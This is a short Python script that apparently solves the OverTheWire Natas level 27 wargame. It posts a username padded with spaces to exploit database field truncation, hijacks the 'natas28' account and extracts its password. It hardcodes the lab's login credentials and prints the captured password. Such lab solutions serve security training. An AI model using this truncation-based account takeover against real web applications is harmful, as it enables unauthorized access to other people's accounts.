import requests
import re

url = 'http://natas27.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas27','55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

# username and password can be null
# username and password can have leading spaces

buf = ' ' * 64 + 'asdf'
data = {'username':'natas28'+buf, 'password':'eyeswithoutaface'}
resp = requests.post(url, auth=auth, data=data)

data = {'username':'natas28', 'password':'eyeswithoutaface'}
resp = requests.post(url, auth=auth, data=data)

pwd = re.findall('password\] =&gt; (.*)', resp.text)[0]
print(pwd) # JWwR438wkgTsNKBbcJoowyysdM82YjeF


